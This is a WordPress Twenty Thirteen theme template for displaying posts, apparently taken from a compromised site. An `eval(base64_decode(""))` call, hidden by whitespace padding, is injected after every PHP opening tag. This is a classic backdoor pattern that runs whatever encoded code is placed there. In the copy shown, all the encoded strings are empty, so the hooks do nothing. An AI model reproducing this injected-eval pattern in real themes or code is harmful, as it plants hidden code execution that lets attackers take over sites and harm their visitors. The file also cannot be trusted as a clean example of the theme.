<?php	 	eval(base64_decode(""));
/**
 * The default template for displaying content. Used for both single and index/archive/search.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

<article id="post-<?php	 	eval(base64_decode("")); the_ID(); ?>" <?php	 	eval(base64_decode("")); post_class(); ?>>
	<header class="entry-header">
		<?php	 	eval(base64_decode("")); if ( has_post_thumbnail() && ! post_password_required() ) : ?>
		<div class="entry-thumbnail">
			<?php	 	eval(base64_decode("")); the_post_thumbnail(); ?>
		</div>
		<?php	 	eval(base64_decode("")); endif; ?>

		<?php	 	eval(base64_decode("")); if ( is_single() ) : ?>
		<h1 class="entry-title"><?php	 	eval(base64_decode("")); the_title(); ?></h1>
		<?php	 	eval(base64_decode("")); else : ?>
		<h1 class="entry-title">
			<a href="<?php	 	eval(base64_decode("")); the_permalink(); ?>" rel="bookmark"><?php	 	eval(base64_decode("")); the_title(); ?></a>
		</h1>
		<?php	 	eval(base64_decode("")); endif; // is_single() ?>

		<div class="entry-meta">
			<?php	 	eval(base64_decode("")); twentythirteen_entry_meta(); ?>
			<?php	 	eval(base64_decode("")); edit_post_link( __( 'Edit', 'twentythirteen' ), '<span class="edit-link">', '</span>' ); ?>
		</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<?php	 	eval(base64_decode("")); if ( is_search() ) : // Only display Excerpts for Search ?>
	<div class="entry-summary">
		<?php	 	eval(base64_decode("")); the_excerpt(); ?>
	</div><!-- .entry-summary -->
	<?php	 	eval(base64_decode("")); else : ?>
	<div class="entry-content">
		<?php	 	eval(base64_decode("")); the_content( __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'twentythirteen' ) ); ?>
		<?php	 	eval(base64_decode("")); wp_link_pages( array( 'before' => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentythirteen' ) . '</span>', 'after' => '</div>', 'link_before' => '<span>', 'link_after' => '</span>' ) ); ?>
	</div><!-- .entry-content -->
	<?php	 	eval(base64_decode("")); endif; ?>

	<footer class="entry-meta">
		<?php	 	eval(base64_decode("")); if ( comments_open() && ! is_single() ) : ?>
			<div class="comments-link">
				<?php	 	eval(base64_decode("")); comments_popup_link( '<span class="leave-reply">' . __( 'Leave a comment', 'twentythirteen' ) . '</span>', __( 'One comment so far', 'twentythirteen' ), __( 'View all % comments', 'twentythirteen' ) ); ?>
			</div><!-- .comments-link -->
		<?php	 	eval(base64_decode("")); endif; // comments_open() ?>

		<?php	 	eval(base64_decode("")); if ( is_single() && get_the_author_meta( 'description' ) && is_multi_author() ) : ?>
			<?php	 	eval(base64_decode("")); get_template_part( 'author-bio' ); ?>
		<?php	 	eval(base64_decode("")); endif; ?>
	</footer><!-- .entry-meta -->
</article><!-- #post -->
